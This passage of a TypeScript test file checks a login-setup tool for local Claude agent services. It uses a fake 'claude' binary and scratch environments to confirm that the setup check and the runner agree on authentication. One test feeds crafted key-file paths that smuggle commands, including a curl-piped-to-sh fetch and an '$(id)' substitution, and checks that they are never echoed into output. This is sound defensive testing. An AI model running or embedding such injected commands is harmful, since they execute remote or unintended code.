  writeFileSync(join(accountDir, 'status.json'), JSON.stringify({ at: '2026-10-19T10:00:00Z', users: [{ instance: 'other', kind: 'agent', user: 'wl-other-agent', stored: true, logged_in: true, auth_method: 'claude.ai' }, { instance: 'shop', kind: 'eval', user: 'wl-shop-eval', stored: true, logged_in: true, auth_method: 'claude.ai' }] }));
  assert.equal(named(lines(), 'setup claude-account record')?.level, 'warn');
});

test("#738 round 3: a key file path read back from init's state is shown only when it is a plain absolute path", () => {
  const p = newProject();
  for (const crafted of ['/k; curl -s http://example.invalid/x | sh; #', '/k", "env": {"X": "1"}, "y": "', '/k\nPATH=/evil', "/k'$(id)'"]) {
    const state = newState('local', p.root, REPO, null);
    state.agentRuntime = { kind: 'api_key', keyFile: crafted } as never;
    for (const method of ['claude.ai', 'api_key_helper']) {
      const c = checkSetup(setupContext(state, { mode: 'local', root: p.root, repo: REPO, instance: null, stateDir: projectStateDir(p.root), policyFile: null }), world({ method }).probe)
        .groups.flatMap((g) => g.steps).find((x) => x.id === 'claude-login')!;
      assert.equal((c.fix as { command?: string }).command, '"apiKeyHelper": "cat -- <your key file>"', `${JSON.stringify(crafted)}: ${JSON.stringify(c.fix)}`);
      assert.ok(!c.detail.includes(crafted) && !c.detail.includes('/k'), `${JSON.stringify(crafted)} is not in the detail: ${c.detail}`);
    }
  }
});

// ---------- the wizard and the runner agree, with a fake claude on PATH and a scratch HOME ----------

/** A fake claude: signs in as a key in its environment would (ANTHROPIC_API_KEY, then CLAUDE_CODE_OAUTH_TOKEN), else as its home says. */
function fakeClaude(): { dir: string; bin: string } {
  const dir = mkdtempSync(join(tmpdir(), 'cr-fake-claude-'));
  const bin = join(dir, 'claude');
  writeFileSync(
    bin,
    `#!/usr/bin/env node
const fs = require('node:fs'), path = require('node:path');
const state = path.join(process.env.HOME || '/nonexistent', '.fake-claude');
const dir = process.env.CLAUDE_CONFIG_DIR ? path.join(process.env.CLAUDE_CONFIG_DIR, 'fake') : state;
const read = (f) => { try { return fs.readFileSync(path.join(dir, f), 'utf8').trim(); } catch { return null; } };
const a = process.argv.slice(2);
const method = process.env.ANTHROPIC_API_KEY ? 'api_key' : process.env.CLAUDE_CODE_OAUTH_TOKEN ? 'oauth_token' : read('method');
if (a[0] === 'auth' && a[1] === 'status') {
  if (read('plain')) { console.log('Logged in as someone'); process.exit(0); }
  if (read('noflag')) { console.log(JSON.stringify({ authMethod: 'claude.ai' })); process.exit(0); }
  if (read('strflag')) { console.log(JSON.stringify({ loggedIn: 'false', authMethod: 'claude.ai' })); process.exit(0); }
  if (read('oneflag')) { console.log(JSON.stringify({ loggedIn: 1, authMethod: 'claude.ai' })); process.exit(0); }
  if (!method) { console.log(JSON.stringify({ loggedIn: false, authMethod: 'none' })); process.exit(1); }
  console.log(JSON.stringify({ loggedIn: true, authMethod: method })); process.exit(0);
}
if (a[0] === '-p') { console.log(JSON.stringify({ type: 'result', subtype: 'success', is_error: false, result: 'ok', total_cost_usd: 0 })); process.exit(0); }
const at = a.indexOf('--settings');
process.stdout.write(JSON.stringify({ type: 'system', subtype: 'init', output_style: (at >= 0 && JSON.parse(a[at + 1]).outputStyle) || 'default' }) + '\\n');
process.stdout.write(JSON.stringify({ type: 'result', subtype: 'success', is_error: false, result: 'ok', num_turns: 1, total_cost_usd: 0 }) + '\\n');
process.stdin.on('data', () => {}); process.stdin.on('end', () => process.exit(0));
setTimeout(() => process.exit(0), 200);
`,
  );
  chmodSync(bin, 0o755);
  return { dir, bin };
}

const runReq = (cwd: string): RunRequest => ({ role: 'worker', prompt: 'p', cwd, model: 'm', allowedTools: [], maxTurns: 1, maxBudgetUsd: 0.01, stallMs: 30_000, timeoutMs: 30_000 });

test("#738: the step is done exactly when the local service's runs would start on that login (a fake claude on PATH, a scratch HOME)", { skip: posixOnly }, async (t) => {
  const fake = fakeClaude();
  // [kind, the login claude finds (in its home, or under the shell's CLAUDE_CONFIG_DIR), what else the person's
  // shell has, done/starts?, what the user service manager sets]. The runner is the local service's, built as
  // src/service.ts builds it on the service's real environment: the manager's, then the unit's own (localServiceSpec:
  // PATH and HOME) on top. A manager CLAUDE_CONFIG_DIR given as 'DIR:<method>' is a directory whose login is that.
  const cases: ['cli' | 'api_key', string | null, Record<string, string>, boolean, Record<string, string>?][] = [
    ['cli', 'claude.ai', {}, false, { CLAUDE_CONFIG_DIR: 'DIR:api_key_helper' }],
    ['cli', null, {}, true, { CLAUDE_CONFIG_DIR: 'DIR:claude.ai' }],
    ['cli', 'claude.ai', {}, true, { ANTHROPIC_API_KEY: 'sk-ant-manager-key-738' }],
    ['cli', null, {}, false, { CLAUDE_CODE_OAUTH_TOKEN: 'manager-token-738' }],
    ['api_key', null, {}, true, { ANTHROPIC_API_KEY: 'sk-ant-manager-key-738' }],
    ['api_key', 'claude.ai', {}, false, { ANTHROPIC_AUTH_TOKEN: 'manager-auth-738' }],
    ['cli', 'claude.ai', {}, true],
    ['cli', 'claude.ai', { ANTHROPIC_API_KEY: 'sk-ant-env-key-738' }, true],
    ['cli', null, { CLAUDE_CODE_OAUTH_TOKEN: 'env-token-738' }, false],
    ['cli', null, { ANTHROPIC_API_KEY: 'sk-ant-env-key-738' }, false],
    ['cli', 'cfgdir', {}, false],
    ['cli', 'api_key_helper', {}, false],
    ['cli', 'stand-in', {}, false],
    ['cli', 'plain', {}, false],
    ['cli', 'noflag', {}, false],
    ['cli', 'strflag', {}, false],
    ['cli', 'oneflag', {}, false],
    ['api_key', 'api_key_helper', {}, true],
    ['api_key', null, { ANTHROPIC_API_KEY: 'sk-ant-env-key-738' }, false],
    ['api_key', 'claude.ai', {}, false],
  ];
  const saved = { ...process.env };
  try {
    // One subtest per case, so each is reported on its own (and in a fail-without run).
    for (const [kind, login, extra, expected, manager] of cases) await t.test(`${kind}, ${login ?? 'no login'} ${JSON.stringify(Object.keys(extra))}${manager ? ` manager ${JSON.stringify(Object.keys(manager))}` : ''}`, async () => {
      const home = mkdtempSync(join(tmpdir(), 'cr-home-'));
      mkdirSync(join(home, '.fake-claude'));
      const managerEnv: Record<string, string> = {};
      for (const [k, v] of Object.entries(manager ?? {})) {
        if (!v.startsWith('DIR:')) managerEnv[k] = v;
        else {
          const d = mkdtempSync(join(tmpdir(), 'cr-mgrdir-'));
          mkdirSync(join(d, 'fake'));
          writeFileSync(join(d, 'fake', 'method'), v.slice(4));
          managerEnv[k] = d;
        }
      }
      const shellOnly: Record<string, string> = {};
      if (login === 'cfgdir') {
        // claude.ai only under a CLAUDE_CONFIG_DIR the shell has; the service never gets that variable.
        const cfgDir = mkdtempSync(join(tmpdir(), 'cr-cfgdir-'));
        mkdirSync(join(cfgDir, 'fake'));
        writeFileSync(join(cfgDir, 'fake', 'method'), 'claude.ai');
        shellOnly.CLAUDE_CONFIG_DIR = cfgDir;
      } else if (['plain', 'noflag', 'strflag', 'oneflag'].includes(login ?? '')) writeFileSync(join(home, '.fake-claude', login!), '1');
      else if (login) writeFileSync(join(home, '.fake-claude', 'method'), login);
      const env: NodeJS.ProcessEnv = { PATH: [fake.dir, dirname(process.execPath), '/usr/bin', '/bin'].join(delimiter), HOME: home, [`${BRAND.envPrefix}_PREFIX`]: join(home, '.local'), ...extra, ...shellOnly };
      for (const k of Object.keys(process.env)) if (/^(ANTHROPIC_|CLAUDE_CODE_OAUTH_TOKEN$|CLAUDE_CONFIG_DIR$)/.test(k)) delete process.env[k];
      Object.assign(process.env, env);
      const root = existingProject(kind);
      const view = checkSetup(setupContext(null, { mode: 'local', root, repo: REPO, instance: null, stateDir: projectStateDir(root), policyFile: null }), systemProbe({ managerEnv: { env: managerEnv } }));
      const step = view.groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-login')!;
      const unit = localServiceSpec(root, loadConfig(root)).env!;
      assert.deepEqual(Object.keys(unit).sort(), ['HOME', 'PATH'], "the unit's own Environment= lines");
      // The service process's environment: the manager's, with the unit's lines on top (systemd.exec(5)).
      const service = { ...managerEnv, ...unit };
      const r = await new CliRunner(kind, service, fake.bin, undefined, undefined, undefined, { budgetMs: 0, sleep: async () => false }).run(runReq(root));
      const label = `${kind}, ${login ?? 'no login'} ${JSON.stringify(Object.keys(extra))} manager ${JSON.stringify(Object.keys(managerEnv))}`;
      assert.equal(r.reason !== 'auth_mismatch', expected, `${label}: the runner ${r.reason}: ${r.detail}`);
      assert.equal(step.done, expected, `${label}: the step says ${step.detail}`);
      if (kind === 'cli' && login === 'claude.ai' && !manager) assert.equal(step.detail, SUBSCRIPTION_DONE, `${label}: the login the agents get, not the shell's key`);
      for (const v of Object.values(managerEnv)) if (!v.startsWith('/')) assert.ok(!step.detail.includes(v), `${label}: a manager value is never shown`);
    });
  } finally {
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
    Object.assign(process.env, saved);
  }
});
